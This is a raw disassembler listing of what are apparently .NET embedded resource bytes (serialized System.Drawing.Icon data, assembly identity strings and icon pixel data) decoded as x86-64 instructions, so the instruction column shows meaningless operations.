  40ac81:	56                   	push   %rsi
  40ac82:	65 72 73             	gs jb  0x40acf8
  40ac85:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%rdi),%ebp
  40ac8c:	2e 30 2e             	cs xor %ch,(%rsi)
  40ac8f:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40ac92:	43 75 6c             	rex.XB jne 0x40ad01
  40ac95:	74 75                	je     0x40ad0c
  40ac97:	72 65                	jb     0x40acfe
  40ac99:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40ac9e:	72 61                	jb     0x40ad01
  40aca0:	6c                   	insb   (%dx),(%rdi)
  40aca1:	2c 20                	sub    $0x20,%al
  40aca3:	50                   	push   %rax
  40aca4:	75 62                	jne    0x40ad08
  40aca6:	6c                   	insb   (%dx),(%rdi)
  40aca7:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40acae:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40acb2:	62                   	(bad)
  40acb3:	30 33                	xor    %dh,(%rbx)
  40acb5:	66 35 66 37          	xor    $0x3766,%ax
  40acb9:	66 31 31             	xor    %si,(%rcx)
  40acbc:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  40acc2:	05 01 00 00 00       	add    $0x1,%eax
  40acc7:	13 53 79             	adc    0x79(%rbx),%edx
  40acca:	73 74                	jae    0x40ad40
  40accc:	65 6d                	gs insl (%dx),(%rdi)
  40acce:	2e 44 72 61          	rex.R jb,pn 0x40ad33
  40acd2:	77 69                	ja     0x40ad3d
  40acd4:	6e                   	outsb  (%rsi),(%dx)
  40acd5:	67 2e 49 63 6f 6e    	cs movslq 0x6e(%r15d),%rbp
  40acdb:	02 00                	add    (%rax),%al
  40acdd:	00 00                	add    %al,(%rax)
  40acdf:	08 49 63             	or     %cl,0x63(%rcx)
  40ace2:	6f                   	outsl  (%rsi),(%dx)
  40ace3:	6e                   	outsb  (%rsi),(%dx)
  40ace4:	44 61                	rex.R (bad)
  40ace6:	74 61                	je     0x40ad49
  40ace8:	08 49 63             	or     %cl,0x63(%rcx)
  40aceb:	6f                   	outsl  (%rsi),(%dx)
  40acec:	6e                   	outsb  (%rsi),(%dx)
  40aced:	53                   	push   %rbx
  40acee:	69 7a 65 07 04 02 13 	imul   $0x13020407,0x65(%rdx),%edi
  40acf5:	53                   	push   %rbx
  40acf6:	79 73                	jns    0x40ad6b
  40acf8:	74 65                	je     0x40ad5f
  40acfa:	6d                   	insl   (%dx),(%rdi)
  40acfb:	2e 44 72 61          	rex.R jb,pn 0x40ad60
  40acff:	77 69                	ja     0x40ad6a
  40ad01:	6e                   	outsb  (%rsi),(%dx)
  40ad02:	67 2e 53             	addr32 cs push %rbx
  40ad05:	69 7a 65 02 00 00 00 	imul   $0x2,0x65(%rdx),%edi
  40ad0c:	02 00                	add    (%rax),%al
  40ad0e:	00 00                	add    %al,(%rax)
  40ad10:	09 03                	or     %eax,(%rbx)
  40ad12:	00 00                	add    %al,(%rax)
  40ad14:	00 05 fc ff ff ff    	add    %al,-0x4(%rip)        # 0x40ad16
  40ad1a:	13 53 79             	adc    0x79(%rbx),%edx
  40ad1d:	73 74                	jae    0x40ad93
  40ad1f:	65 6d                	gs insl (%dx),(%rdi)
  40ad21:	2e 44 72 61          	rex.R jb,pn 0x40ad86
  40ad25:	77 69                	ja     0x40ad90
  40ad27:	6e                   	outsb  (%rsi),(%dx)
  40ad28:	67 2e 53             	addr32 cs push %rbx
  40ad2b:	69 7a 65 02 00 00 00 	imul   $0x2,0x65(%rdx),%edi
  40ad32:	05 77 69 64 74       	add    $0x74646977,%eax
  40ad37:	68 06 68 65 69       	push   $0x69656806
  40ad3c:	67 68 74 00 00 08    	addr32 push $0x8000074
  40ad42:	08 02                	or     %al,(%rdx)
	...
  40ad4c:	00 00                	add    %al,(%rax)
  40ad4e:	00 0f                	add    %cl,(%rdi)
  40ad50:	03 00                	add    (%rax),%eax
  40ad52:	00 00                	add    %al,(%rax)
  40ad54:	be 08 00 00 02       	mov    $0x2000008,%esi
  40ad59:	00 00                	add    %al,(%rax)
  40ad5b:	01 00                	add    %eax,(%rax)
  40ad5d:	01 00                	add    %eax,(%rax)
  40ad5f:	20 20                	and    %ah,(%rax)
  40ad61:	00 00                	add    %al,(%rax)
  40ad63:	00 00                	add    %al,(%rax)
  40ad65:	00 00                	add    %al,(%rax)
  40ad67:	a8 08                	test   $0x8,%al
  40ad69:	00 00                	add    %al,(%rax)
  40ad6b:	16                   	(bad)
  40ad6c:	00 00                	add    %al,(%rax)
  40ad6e:	00 28                	add    %ch,(%rax)
  40ad70:	00 00                	add    %al,(%rax)
  40ad72:	00 20                	add    %ah,(%rax)
  40ad74:	00 00                	add    %al,(%rax)
  40ad76:	00 40 00             	add    %al,0x0(%rax)
  40ad79:	00 00                	add    %al,(%rax)
  40ad7b:	01 00                	add    %eax,(%rax)
  40ad7d:	08 00                	or     %al,(%rax)
  40ad7f:	00 00                	add    %al,(%rax)
  40ad81:	00 00                	add    %al,(%rax)
  40ad83:	80 04 00 00          	addb   $0x0,(%rax,%rax,1)
	...
  40ad9b:	84 82 84 00 c6 c3    	test   %al,-0x3c39ff7c(%rdx)
  40ada1:	c6 00 ff             	movb   $0xff,(%rax)
  40ada4:	ff                   	(bad)
  40ada5:	ff 00                	incl   (%rax)
  40ada7:	bd 00 00 00 00       	mov    $0x0,%ebp
	...
  40b1d4:	00 00                	add    %al,(%rax)
  40b1d6:	00 01                	add    %al,(%rcx)
  40b1d8:	01 01                	add    %eax,(%rcx)
  40b1da:	01 01                	add    %eax,(%rcx)
  40b1dc:	01 01                	add    %eax,(%rcx)
  40b1de:	01 01                	add    %eax,(%rcx)
  40b1e0:	01 01                	add    %eax,(%rcx)
  40b1e2:	01 01                	add    %eax,(%rcx)
  40b1e4:	01 01                	add    %eax,(%rcx)
  40b1e6:	01 01                	add    %eax,(%rcx)
  40b1e8:	01 01                	add    %eax,(%rcx)
  40b1ea:	01 01                	add    %eax,(%rcx)
  40b1ec:	01 01                	add    %eax,(%rcx)
  40b1ee:	01 01                	add    %eax,(%rcx)
  40b1f0:	01 01                	add    %eax,(%rcx)
  40b1f2:	01 01                	add    %eax,(%rcx)
  40b1f4:	01 01                	add    %eax,(%rcx)
  40b1f6:	00 01                	add    %al,(%rcx)
  40b1f8:	02 02                	add    (%rdx),%al
  40b1fa:	02 02                	add    (%rdx),%al
  40b1fc:	02 02                	add    (%rdx),%al
  40b1fe:	02 02                	add    (%rdx),%al
  40b200:	02 02                	add    (%rdx),%al
  40b202:	02 02                	add    (%rdx),%al
  40b204:	02 02                	add    (%rdx),%al
  40b206:	02 02                	add    (%rdx),%al
  40b208:	02 02                	add    (%rdx),%al
  40b20a:	02 02                	add    (%rdx),%al
  40b20c:	02 02                	add    (%rdx),%al
  40b20e:	02 02                	add    (%rdx),%al
  40b210:	02 02                	add    (%rdx),%al
  40b212:	02 02                	add    (%rdx),%al
  40b214:	02 01                	add    (%rcx),%al
  40b216:	00 01                	add    %al,(%rcx)
  40b218:	02 01                	add    (%rcx),%al
  40b21a:	03 03                	add    (%rbx),%eax
  40b21c:	03 03                	add    (%rbx),%eax
  40b21e:	03 03                	add    (%rbx),%eax
  40b220:	03 03                	add    (%rbx),%eax
  40b222:	03 03                	add    (%rbx),%eax
  40b224:	03 03                	add    (%rbx),%eax
  40b226:	03 03                	add    (%rbx),%eax
  40b228:	03 03                	add    (%rbx),%eax
  40b22a:	03 03                	add    (%rbx),%eax
  40b22c:	03 03                	add    (%rbx),%eax
  40b22e:	03 03                	add    (%rbx),%eax
  40b230:	03 03                	add    (%rbx),%eax
  40b232:	03 03                	add    (%rbx),%eax
  40b234:	02 01                	add    (%rcx),%al
  40b236:	00 01                	add    %al,(%rcx)
  40b238:	02 01                	add    (%rcx),%al
  40b23a:	03 03                	add    (%rbx),%eax
  40b23c:	03 03                	add    (%rbx),%eax
  40b23e:	03 03                	add    (%rbx),%eax
  40b240:	03 03                	add    (%rbx),%eax
  40b242:	03 03                	add    (%rbx),%eax
  40b244:	03 03                	add    (%rbx),%eax
  40b246:	03 03                	add    (%rbx),%eax
  40b248:	03 03                	add    (%rbx),%eax
  40b24a:	03 03                	add    (%rbx),%eax
  40b24c:	03 03                	add    (%rbx),%eax
  40b24e:	03 03                	add    (%rbx),%eax
  40b250:	03 03                	add    (%rbx),%eax
  40b252:	03 03                	add    (%rbx),%eax
  40b254:	02 01                	add    (%rcx),%al
  40b256:	00 01                	add    %al,(%rcx)
  40b258:	02 01                	add    (%rcx),%al
  40b25a:	03 03                	add    (%rbx),%eax
  40b25c:	03 03                	add    (%rbx),%eax
  40b25e:	03 03                	add    (%rbx),%eax
  40b260:	03 03                	add    (%rbx),%eax
  40b262:	03 03                	add    (%rbx),%eax
  40b264:	03 03                	add    (%rbx),%eax
  40b266:	03 03                	add    (%rbx),%eax
  40b268:	03 03                	add    (%rbx),%eax
  40b26a:	03 03                	add    (%rbx),%eax
  40b26c:	03 03                	add    (%rbx),%eax
  40b26e:	03 03                	add    (%rbx),%eax
  40b270:	03 03                	add    (%rbx),%eax
  40b272:	03 03                	add    (%rbx),%eax
  40b274:	02 01                	add    (%rcx),%al
  40b276:	00 01                	add    %al,(%rcx)
  40b278:	02 01                	add    (%rcx),%al
  40b27a:	03 03                	add    (%rbx),%eax
  40b27c:	03 03                	add    (%rbx),%eax
  40b27e:	03 03                	add    (%rbx),%eax
  40b280:	03 03                	add    (%rbx),%eax
  40b282:	03 03                	add    (%rbx),%eax
  40b284:	03 03                	add    (%rbx),%eax
  40b286:	03 03                	add    (%rbx),%eax
  40b288:	03 03                	add    (%rbx),%eax
  40b28a:	03 03                	add    (%rbx),%eax
  40b28c:	03 03                	add    (%rbx),%eax
  40b28e:	03 03                	add    (%rbx),%eax
  40b290:	03 03                	add    (%rbx),%eax
  40b292:	03 03                	add    (%rbx),%eax
  40b294:	02 01                	add    (%rcx),%al
  40b296:	00 01                	add    %al,(%rcx)
  40b298:	02 01                	add    (%rcx),%al
  40b29a:	03 03                	add    (%rbx),%eax
  40b29c:	03 03                	add    (%rbx),%eax
  40b29e:	03 03                	add    (%rbx),%eax
  40b2a0:	03 03                	add    (%rbx),%eax
  40b2a2:	03 03                	add    (%rbx),%eax
  40b2a4:	03 03                	add    (%rbx),%eax
  40b2a6:	03 03                	add    (%rbx),%eax
  40b2a8:	03 03                	add    (%rbx),%eax
  40b2aa:	03 03                	add    (%rbx),%eax
  40b2ac:	03 03                	add    (%rbx),%eax
  40b2ae:	03 03                	add    (%rbx),%eax
  40b2b0:	03 03                	add    (%rbx),%eax
  40b2b2:	03 03                	add    (%rbx),%eax
  40b2b4:	02 01                	add    (%rcx),%al
  40b2b6:	00 01                	add    %al,(%rcx)
  40b2b8:	02 01                	add    (%rcx),%al
  40b2ba:	03 03                	add    (%rbx),%eax
  40b2bc:	03 03                	add    (%rbx),%eax
  40b2be:	03 03                	add    (%rbx),%eax
  40b2c0:	03 03                	add    (%rbx),%eax
  40b2c2:	03 03                	add    (%rbx),%eax
  40b2c4:	03 03                	add    (%rbx),%eax
  40b2c6:	03 03                	add    (%rbx),%eax
  40b2c8:	03 03                	add    (%rbx),%eax
  40b2ca:	03 03                	add    (%rbx),%eax
  40b2cc:	03 03                	add    (%rbx),%eax
  40b2ce:	03 03                	add    (%rbx),%eax
  40b2d0:	03 03                	add    (%rbx),%eax
  40b2d2:	03 03                	add    (%rbx),%eax
  40b2d4:	02 01                	add    (%rcx),%al
  40b2d6:	00 01                	add    %al,(%rcx)
  40b2d8:	02 01                	add    (%rcx),%al
  40b2da:	03 03                	add    (%rbx),%eax
  40b2dc:	03 03                	add    (%rbx),%eax
  40b2de:	03 03                	add    (%rbx),%eax
  40b2e0:	03 03                	add    (%rbx),%eax
  40b2e2:	03 03                	add    (%rbx),%eax
  40b2e4:	03 03                	add    (%rbx),%eax
  40b2e6:	03 03                	add    (%rbx),%eax
  40b2e8:	03 03                	add    (%rbx),%eax
  40b2ea:	03 03                	add    (%rbx),%eax
  40b2ec:	03 03                	add    (%rbx),%eax
  40b2ee:	03 03                	add    (%rbx),%eax
  40b2f0:	03 03                	add    (%rbx),%eax
  40b2f2:	03 03                	add    (%rbx),%eax
  40b2f4:	02 01                	add    (%rcx),%al
  40b2f6:	00 01                	add    %al,(%rcx)
  40b2f8:	02 01                	add    (%rcx),%al
  40b2fa:	03 03                	add    (%rbx),%eax
  40b2fc:	03 03                	add    (%rbx),%eax
  40b2fe:	03 03                	add    (%rbx),%eax
  40b300:	03 03                	add    (%rbx),%eax
  40b302:	03 03                	add    (%rbx),%eax
  40b304:	03 03                	add    (%rbx),%eax
  40b306:	03 03                	add    (%rbx),%eax
  40b308:	03 03                	add    (%rbx),%eax
  40b30a:	03 03                	add    (%rbx),%eax
  40b30c:	03 03                	add    (%rbx),%eax
  40b30e:	03 03                	add    (%rbx),%eax
  40b310:	03 03                	add    (%rbx),%eax
  40b312:	03 03                	add    (%rbx),%eax
  40b314:	02 01                	add    (%rcx),%al
  40b316:	00 01                	add    %al,(%rcx)
  40b318:	02 01                	add    (%rcx),%al
  40b31a:	03 03                	add    (%rbx),%eax
  40b31c:	03 03                	add    (%rbx),%eax
  40b31e:	03 03                	add    (%rbx),%eax
  40b320:	03 03                	add    (%rbx),%eax
  40b322:	03 03                	add    (%rbx),%eax
  40b324:	03 03                	add    (%rbx),%eax
  40b326:	03 03                	add    (%rbx),%eax
  40b328:	03 03                	add    (%rbx),%eax
  40b32a:	03 03                	add    (%rbx),%eax
  40b32c:	03 03                	add    (%rbx),%eax
  40b32e:	03 03                	add    (%rbx),%eax
  40b330:	03 03                	add    (%rbx),%eax
  40b332:	03 03                	add    (%rbx),%eax
  40b334:	02 01                	add    (%rcx),%al
  40b336:	00 01                	add    %al,(%rcx)
  40b338:	02 01                	add    (%rcx),%al
  40b33a:	03 03                	add    (%rbx),%eax
  40b33c:	03 03                	add    (%rbx),%eax
  40b33e:	03 03                	add    (%rbx),%eax
  40b340:	03 03                	add    (%rbx),%eax
  40b342:	03 03                	add    (%rbx),%eax
  40b344:	03 03                	add    (%rbx),%eax
  40b346:	03 03                	add    (%rbx),%eax
  40b348:	03 03                	add    (%rbx),%eax
  40b34a:	03 03                	add    (%rbx),%eax
  40b34c:	03 03                	add    (%rbx),%eax
  40b34e:	03 03                	add    (%rbx),%eax
  40b350:	03 03                	add    (%rbx),%eax
  40b352:	03 03                	add    (%rbx),%eax
  40b354:	02 01                	add    (%rcx),%al
  40b356:	00 01                	add    %al,(%rcx)
  40b358:	02 01                	add    (%rcx),%al
  40b35a:	03 03                	add    (%rbx),%eax
  40b35c:	03 03                	add    (%rbx),%eax
  40b35e:	03 03                	add    (%rbx),%eax
  40b360:	03 03                	add    (%rbx),%eax
  40b362:	03 03                	add    (%rbx),%eax
  40b364:	03 03                	add    (%rbx),%eax
  40b366:	03 03                	add    (%rbx),%eax
  40b368:	03 03                	add    (%rbx),%eax
  40b36a:	03 03                	add    (%rbx),%eax
  40b36c:	03 03                	add    (%rbx),%eax
  40b36e:	03 03                	add    (%rbx),%eax
  40b370:	03 03                	add    (%rbx),%eax
  40b372:	03 03                	add    (%rbx),%eax
  40b374:	02 01                	add    (%rcx),%al
  40b376:	00 01                	add    %al,(%rcx)
  40b378:	02 01                	add    (%rcx),%al
  40b37a:	03 03                	add    (%rbx),%eax
  40b37c:	03 03                	add    (%rbx),%eax
  40b37e:	03 03                	add    (%rbx),%eax
  40b380:	03 03                	add    (%rbx),%eax
  40b382:	03 03                	add    (%rbx),%eax
  40b384:	03 03                	add    (%rbx),%eax
  40b386:	03 03                	add    (%rbx),%eax
  40b388:	03 03                	add    (%rbx),%eax
  40b38a:	03 03                	add    (%rbx),%eax
  40b38c:	03 03                	add    (%rbx),%eax
  40b38e:	03 03                	add    (%rbx),%eax
  40b390:	03 03                	add    (%rbx),%eax
  40b392:	03 03                	add    (%rbx),%eax
  40b394:	02 01                	add    (%rcx),%al
  40b396:	00 01                	add    %al,(%rcx)
  40b398:	02 01                	add    (%rcx),%al
  40b39a:	03 03                	add    (%rbx),%eax
  40b39c:	03 03                	add    (%rbx),%eax
  40b39e:	03 03                	add    (%rbx),%eax
  40b3a0:	03 03                	add    (%rbx),%eax
  40b3a2:	03 03                	add    (%rbx),%eax
  40b3a4:	03 03                	add    (%rbx),%eax
  40b3a6:	03 03                	add    (%rbx),%eax
  40b3a8:	03 03                	add    (%rbx),%eax
  40b3aa:	03 03                	add    (%rbx),%eax
  40b3ac:	03 03                	add    (%rbx),%eax
  40b3ae:	03 03                	add    (%rbx),%eax
  40b3b0:	03 03                	add    (%rbx),%eax
  40b3b2:	03 03                	add    (%rbx),%eax
  40b3b4:	02 01                	add    (%rcx),%al
  40b3b6:	00 01                	add    %al,(%rcx)
  40b3b8:	02 01                	add    (%rcx),%al
  40b3ba:	03 03                	add    (%rbx),%eax
  40b3bc:	03 03                	add    (%rbx),%eax
  40b3be:	03 03                	add    (%rbx),%eax
  40b3c0:	03 03                	add    (%rbx),%eax
  40b3c2:	03 03                	add    (%rbx),%eax
  40b3c4:	03 03                	add    (%rbx),%eax
  40b3c6:	03 03                	add    (%rbx),%eax
  40b3c8:	03 03                	add    (%rbx),%eax
  40b3ca:	03 03                	add    (%rbx),%eax
  40b3cc:	03 03                	add    (%rbx),%eax
  40b3ce:	03 03                	add    (%rbx),%eax
  40b3d0:	03 03                	add    (%rbx),%eax
  40b3d2:	03 03                	add    (%rbx),%eax
  40b3d4:	02 01                	add    (%rcx),%al
  40b3d6:	00 01                	add    %al,(%rcx)
  40b3d8:	02 01                	add    (%rcx),%al
  40b3da:	03 03                	add    (%rbx),%eax
  40b3dc:	03 03                	add    (%rbx),%eax
  40b3de:	03 03                	add    (%rbx),%eax
  40b3e0:	03 03                	add    (%rbx),%eax
  40b3e2:	03 03                	add    (%rbx),%eax
  40b3e4:	03 03                	add    (%rbx),%eax
  40b3e6:	03 03                	add    (%rbx),%eax
  40b3e8:	03 03                	add    (%rbx),%eax
  40b3ea:	03 03                	add    (%rbx),%eax
  40b3ec:	03 03                	add    (%rbx),%eax
  40b3ee:	03 03                	add    (%rbx),%eax
  40b3f0:	03 03                	add    (%rbx),%eax
  40b3f2:	03 03                	add    (%rbx),%eax
  40b3f4:	02 01                	add    (%rcx),%al
  40b3f6:	00 01                	add    %al,(%rcx)
  40b3f8:	02 01                	add    (%rcx),%al
  40b3fa:	03 03                	add    (%rbx),%eax
  40b3fc:	03 03                	add    (%rbx),%eax
  40b3fe:	03 03                	add    (%rbx),%eax
  40b400:	03 03                	add    (%rbx),%eax
  40b402:	03 03                	add    (%rbx),%eax
  40b404:	03 03                	add    (%rbx),%eax
  40b406:	03 03                	add    (%rbx),%eax
  40b408:	03 03                	add    (%rbx),%eax
  40b40a:	03 03                	add    (%rbx),%eax
  40b40c:	03 03                	add    (%rbx),%eax
  40b40e:	03 03                	add    (%rbx),%eax
  40b410:	03 03                	add    (%rbx),%eax
  40b412:	03 03                	add    (%rbx),%eax
  40b414:	02 01                	add    (%rcx),%al
  40b416:	00 01                	add    %al,(%rcx)
  40b418:	02 01                	add    (%rcx),%al
  40b41a:	03 03                	add    (%rbx),%eax
  40b41c:	03 03                	add    (%rbx),%eax
  40b41e:	03 03                	add    (%rbx),%eax
  40b420:	03 03                	add    (%rbx),%eax
  40b422:	03 03                	add    (%rbx),%eax
  40b424:	03 03                	add    (%rbx),%eax
  40b426:	03 03                	add    (%rbx),%eax
  40b428:	03 03                	add    (%rbx),%eax
  40b42a:	03 03                	add    (%rbx),%eax
  40b42c:	03 03                	add    (%rbx),%eax
  40b42e:	03 03                	add    (%rbx),%eax
  40b430:	03 03                	add    (%rbx),%eax
  40b432:	03 03                	add    (%rbx),%eax
  40b434:	02 01                	add    (%rcx),%al
  40b436:	00 01                	add    %al,(%rcx)
  40b438:	02 01                	add    (%rcx),%al
  40b43a:	03 03                	add    (%rbx),%eax
  40b43c:	03 03                	add    (%rbx),%eax
  40b43e:	03 03                	add    (%rbx),%eax
  40b440:	03 03                	add    (%rbx),%eax
  40b442:	03 03                	add    (%rbx),%eax
  40b444:	03 03                	add    (%rbx),%eax
  40b446:	03 03                	add    (%rbx),%eax
  40b448:	03 03                	add    (%rbx),%eax
  40b44a:	03 03                	add    (%rbx),%eax
  40b44c:	03 03                	add    (%rbx),%eax
  40b44e:	03 03                	add    (%rbx),%eax
  40b450:	03 03                	add    (%rbx),%eax
  40b452:	03 03                	add    (%rbx),%eax
  40b454:	02 01                	add    (%rcx),%al
  40b456:	00 01                	add    %al,(%rcx)
  40b458:	02 01                	add    (%rcx),%al
  40b45a:	01 01                	add    %eax,(%rcx)
  40b45c:	01 01                	add    %eax,(%rcx)
  40b45e:	01 01                	add    %eax,(%rcx)
  40b460:	01 01                	add    %eax,(%rcx)
  40b462:	01 01                	add    %eax,(%rcx)
  40b464:	01 01                	add    %eax,(%rcx)
  40b466:	01 01                	add    %eax,(%rcx)
  40b468:	01 01                	add    %eax,(%rcx)
  40b46a:	01 01                	add    %eax,(%rcx)
  40b46c:	01 01                	add    %eax,(%rcx)
  40b46e:	01 01                	add    %eax,(%rcx)
  40b470:	01 01                	add    %eax,(%rcx)
  40b472:	01 01                	add    %eax,(%rcx)
  40b474:	02 01                	add    (%rcx),%al
  40b476:	00 01                	add    %al,(%rcx)
  40b478:	02 02                	add    (%rdx),%al
  40b47a:	02 02                	add    (%rdx),%al
  40b47c:	02 02                	add    (%rdx),%al
  40b47e:	02 02                	add    (%rdx),%al
  40b480:	02 02                	add    (%rdx),%al
  40b482:	02 02                	add    (%rdx),%al
  40b484:	02 02                	add    (%rdx),%al
  40b486:	02 02                	add    (%rdx),%al
  40b488:	02 02                	add    (%rdx),%al
  40b48a:	02 02                	add    (%rdx),%al
  40b48c:	02 02                	add    (%rdx),%al
  40b48e:	02 02                	add    (%rdx),%al
  40b490:	02 02                	add    (%rdx),%al
  40b492:	02 02                	add    (%rdx),%al
  40b494:	02 01                	add    (%rcx),%al
  40b496:	00 01                	add    %al,(%rcx)
  40b498:	02 04 04             	add    (%rsp,%rax,1),%al
  40b49b:	04 04                	add    $0x4,%al
  40b49d:	04 04                	add    $0x4,%al
  40b49f:	04 04                	add    $0x4,%al
  40b4a1:	04 04                	add    $0x4,%al
  40b4a3:	04 04                	add    $0x4,%al
  40b4a5:	04 04                	add    $0x4,%al
  40b4a7:	04 04                	add    $0x4,%al
  40b4a9:	04 04                	add    $0x4,%al
  40b4ab:	04 00                	add    $0x0,%al
	...
  40b4b5:	01 00                	add    %eax,(%rax)
  40b4b7:	01 02                	add    %eax,(%rdx)
  40b4b9:	04 04                	add    $0x4,%al
  40b4bb:	04 04                	add    $0x4,%al
  40b4bd:	04 04                	add    $0x4,%al
  40b4bf:	04 04                	add    $0x4,%al
  40b4c1:	04 04                	add    $0x4,%al
  40b4c3:	04 04                	add    $0x4,%al
  40b4c5:	04 04                	add    $0x4,%al
  40b4c7:	04 04                	add    $0x4,%al
  40b4c9:	04 04                	add    $0x4,%al
  40b4cb:	04 02                	add    $0x2,%al
  40b4cd:	02 00                	add    (%rax),%al
  40b4cf:	02 02                	add    (%rdx),%al
  40b4d1:	00 02                	add    %al,(%rdx)
  40b4d3:	02 00                	add    (%rax),%al
  40b4d5:	01 00                	add    %eax,(%rax)
  40b4d7:	01 02                	add    %eax,(%rdx)
  40b4d9:	04 04                	add    $0x4,%al
  40b4db:	04 04                	add    $0x4,%al
  40b4dd:	04 04                	add    $0x4,%al
  40b4df:	04 04                	add    $0x4,%al
  40b4e1:	04 04                	add    $0x4,%al
  40b4e3:	04 04                	add    $0x4,%al
  40b4e5:	04 04                	add    $0x4,%al
  40b4e7:	04 04                	add    $0x4,%al
  40b4e9:	04 04                	add    $0x4,%al
  40b4eb:	04 02                	add    $0x2,%al
  40b4ed:	02 00                	add    (%rax),%al
  40b4ef:	02 02                	add    (%rdx),%al
  40b4f1:	00 02                	add    %al,(%rdx)
  40b4f3:	02 00                	add    (%rax),%al
  40b4f5:	01 00                	add    %eax,(%rax)
  40b4f7:	01 02                	add    %eax,(%rdx)
  40b4f9:	04 04                	add    $0x4,%al
  40b4fb:	04 04                	add    $0x4,%al
  40b4fd:	04 04                	add    $0x4,%al
  40b4ff:	04 04                	add    $0x4,%al
  40b501:	04 04                	add    $0x4,%al
  40b503:	04 04                	add    $0x4,%al
  40b505:	04 04                	add    $0x4,%al
  40b507:	04 04                	add    $0x4,%al
  40b509:	04 04                	add    $0x4,%al
  40b50b:	04 04                	add    $0x4,%al
  40b50d:	04 04                	add    $0x4,%al
  40b50f:	04 04                	add    $0x4,%al
  40b511:	04 04                	add    $0x4,%al
  40b513:	04 04                	add    $0x4,%al
  40b515:	01 00                	add    %eax,(%rax)
  40b517:	01 02                	add    %eax,(%rdx)
  40b519:	02 02                	add    (%rdx),%al
  40b51b:	02 02                	add    (%rdx),%al
  40b51d:	02 02                	add    (%rdx),%al
  40b51f:	02 02                	add    (%rdx),%al
  40b521:	02 02                	add    (%rdx),%al
  40b523:	02 02                	add    (%rdx),%al
  40b525:	02 02                	add    (%rdx),%al
  40b527:	02 02                	add    (%rdx),%al
  40b529:	02 02                	add    (%rdx),%al
  40b52b:	02 02                	add    (%rdx),%al
  40b52d:	02 02                	add    (%rdx),%al
  40b52f:	02 02                	add    (%rdx),%al
  40b531:	02 02                	add    (%rdx),%al
  40b533:	02 02                	add    (%rdx),%al
  40b535:	01 00                	add    %eax,(%rax)
  40b537:	01 01                	add    %eax,(%rcx)
  40b539:	01 01                	add    %eax,(%rcx)
  40b53b:	01 01                	add    %eax,(%rcx)
  40b53d:	01 01                	add    %eax,(%rcx)
  40b53f:	01 01                	add    %eax,(%rcx)
  40b541:	01 01                	add    %eax,(%rcx)
  40b543:	01 01                	add    %eax,(%rcx)
  40b545:	01 01                	add    %eax,(%rcx)
  40b547:	01 01                	add    %eax,(%rcx)
  40b549:	01 01                	add    %eax,(%rcx)
  40b54b:	01 01                	add    %eax,(%rcx)
  40b54d:	01 01                	add    %eax,(%rcx)
  40b54f:	01 01                	add    %eax,(%rcx)
  40b551:	01 01                	add    %eax,(%rcx)
  40b553:	01 01                	add    %eax,(%rcx)
  40b555:	01 00                	add    %eax,(%rax)
	...
  40b597:	ff                   	(bad)
  40b598:	ff                   	(bad)
  40b599:	ff                   	(bad)
  40b59a:	ff 00                	incl   (%rax)
	...
  40b60c:	00 00                	add    %al,(%rax)
  40b60e:	00 ff                	add    %bh,%bh
  40b610:	ff                   	(bad)
  40b611:	ff                   	(bad)
  40b612:	ff                   	(bad)
  40b613:	ff                   	(bad)
  40b614:	ff                   	(bad)
  40b615:	ff                   	(bad)
  40b616:	ff 0b                	decl   (%rbx)
  40b618:	02 00                	add    (%rax),%al
  40b61a:	02 01                	add    (%rcx),%al
  40b61c:	41 00 01             	add    %al,(%r9)
  40b61f:	00 00                	add    %al,(%rax)
  40b621:	00 ff                	add    %bh,%bh
  40b623:	ff                   	(bad)
  40b624:	ff                   	(bad)
  40b625:	ff 01                	incl   (%rcx)
  40b627:	00 00                	add    %al,(%rax)
  40b629:	00 00                	add    %al,(%rax)
  40b62b:	00 00                	add    %al,(%rax)
  40b62d:	00 0c 02             	add    %cl,(%rdx,%rax,1)
  40b630:	00 00                	add    %al,(%rax)
  40b632:	00 49 53             	add    %cl,0x53(%rcx)
  40b635:	79 73                	jns    0x40b6aa
  40b637:	74 65                	je     0x40b69e
  40b639:	6d                   	insl   (%dx),(%rdi)
  40b63a:	2c 20                	sub    $0x20,%al
  40b63c:	56                   	push   %rsi
  40b63d:	65 72 73             	gs jb  0x40b6b3
  40b640:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%rdi),%ebp
  40b647:	2e 30 2e             	cs xor %ch,(%rsi)
  40b64a:	30 2c 20             	xor    %ch,(%rax,%riz,1)
  40b64d:	43 75 6c             	rex.XB jne 0x40b6bc
  40b650:	74 75                	je     0x40b6c7
  40b652:	72 65                	jb     0x40b6b9
  40b654:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40b659:	72 61                	jb     0x40b6bc
  40b65b:	6c                   	insb   (%dx),(%rdi)
  40b65c:	2c 20                	sub    $0x20,%al
  40b65e:	50                   	push   %rax
  40b65f:	75 62                	jne    0x40b6c3
  40b661:	6c                   	insb   (%dx),(%rdi)
  40b662:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  40b669:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
  40b66d:	62 37 37 61 35       	(bad)
  40b672:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x3379e7ae
  40b678:	34 65                	xor    $0x65,%al
  40b67a:	30 38                	xor    %bh,(%rax)
  40b67c:	39 05 01 00 00 00    	cmp    %eax,0x1(%rip)        # 0x40b683
  40b682:	1f                   	(bad)
  40b683:	53                   	push   %rbx
  40b684:	79 73                	jns    0x40b6f9
  40b686:	74 65                	je     0x40b6ed
  40b688:	6d                   	insl   (%dx),(%rdi)
  40b689:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
  40b68c:	64 65 44 6f          	fs rex.R outsl %gs:(%rsi),(%dx)
  40b690:	6d                   	insl   (%dx),(%rdi)
  40b691:	2e 4d                	cs rex.WRB
  40b693:	65 6d                	gs insl (%dx),(%rdi)
  40b695:	62 65 72 41 74       	(bad)
  40b69a:	74 72                	je     0x40b70e
  40b69c:	69 62 75 74 65 73 01 	imul   $0x1736574,0x75(%rdx),%esp
  40b6a3:	00 00                	add    %al,(%rax)
  40b6a5:	00 07                	add    %al,(%rdi)
